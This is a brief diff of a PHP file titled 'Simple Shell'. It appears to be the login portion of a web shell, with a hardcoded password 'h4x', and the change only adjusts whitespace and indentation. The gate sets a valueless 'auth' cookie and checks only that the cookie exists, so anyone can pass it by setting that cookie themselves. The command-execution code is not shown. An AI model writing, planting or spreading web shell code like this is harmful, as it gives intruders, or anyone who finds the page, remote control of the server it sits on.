@@ -1,7 +1,7 @@
 <?php
 $password = 'h4x'; # set password here 
-if($_POST['pass'] == $password){ 
-setcookie("auth");
+if ($_POST['pass'] == $password){ 
+  setcookie("auth");
 }
 if (isset($_COOKIE['auth'])){
 echo '<title>Simple Shell</title><style>
